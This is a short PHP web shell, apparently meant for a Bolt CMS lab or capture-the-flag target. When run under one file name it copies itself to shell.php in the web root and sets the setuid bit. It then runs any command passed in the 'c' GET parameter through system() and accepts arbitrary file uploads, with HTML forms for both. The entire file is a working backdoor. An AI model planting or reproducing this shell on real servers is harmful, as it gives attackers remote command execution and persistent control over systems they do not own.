<?php
	if (basename(__FILE__) == "cpshell.php") {
		if (copy("/var/www/html/bolt/files/cpshell.php", "/var/www/html/shell.php")) {
			system("chmod u+s /var/www/html/shell.php");
			echo("Copied successfully.");
		} else {
			echo("Copy failed.");
		}
		
		exit();
	}

	if ($_SERVER["REQUEST_METHOD"] == "GET") {
		if (isset($_GET["c"])) {
			system($_GET["c"]);
		}
	} else if ($_SERVER["REQUEST_METHOD"] == "POST") {
		if (move_uploaded_file($_FILES["userfile"]["tmp_name"], "/var/www/html/tmp/".basename($_FILES["userfile"]["name"]))) {
			echo("Upload successful");
		} else {
			echo("Upload not successful.");
		}

		var_dump($_FILES);
	}
?>
<form action="#" method="GET">
	<input type="text" name="c">
	<input type="submit" value="Send">
</form>
<form enctype="multipart/form-data" action="#" method="POST">
	<input name="userfile" type="file" />
	<input type="submit" value="Send File" />
</form>